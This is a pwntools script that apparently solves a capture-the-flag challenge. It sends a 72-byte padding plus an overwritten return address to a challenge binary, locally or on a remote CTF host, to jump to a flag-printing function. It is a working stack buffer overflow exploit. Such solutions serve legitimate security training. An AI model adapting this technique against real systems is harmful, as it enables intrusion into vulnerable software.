from pwn import *

binary = './chall'
host = 'chall.v1t.site'
port = 30210

context.binary = elf = ELF(binary)
context.log_level = 'info'

duck_addr = 0x40128C

def exploit(io):
    offset = 72
    
    payload = b'A' * offset
    payload += p64(duck_addr)
    
    log.info(f"Sending payload of length {len(payload)}")
    io.sendline(payload)
    
    io.recvuntil(b'FLAG: ')
    flag = io.recvline().strip()
    log.success(f"Flag: {flag.decode()}")
    
    return flag

if __name__ == '__main__':
    if args.REMOTE:
        io = remote(host, port)
    else:
        io = process(binary)
    
    try:
        exploit(io)
        io.interactive()
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        io.close()